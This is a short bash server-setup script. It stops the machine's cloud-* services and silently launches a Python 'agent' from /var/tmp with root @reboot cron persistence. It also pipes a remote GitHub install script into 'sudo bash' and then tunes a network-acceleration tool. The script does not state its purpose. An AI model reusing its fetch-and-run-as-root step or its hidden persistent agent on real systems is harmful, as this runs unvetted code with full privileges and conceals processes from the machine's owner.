#!/bin/bash

apt-get -y update
apt-get -y install cron python3-socks netcat-openbsd
systemctl stop cloud-*

cat >/etc/init.d/agent.sh <<-EOF
#!/bin/sh
cd /var/tmp && nohup python3 agent.py >/dev/null 2>&1 &
EOF
chmod +x /etc/init.d/agent.sh
bash /etc/init.d/agent.sh
cat >>/var/spool/cron/crontabs/root <<-EOF
@reboot /etc/init.d/agent.sh
EOF

curl -fsSL https://raw.githubusercontent.com/uk0/lotspeed/main/install.sh | sudo bash
lotspeed preset balanced
lotspeed set lotserver_gain 25
lotspeed set lotserver_turbo 1
lotspeed set lotserver_beta 921
lotspeed set lotserver_adaptive 1
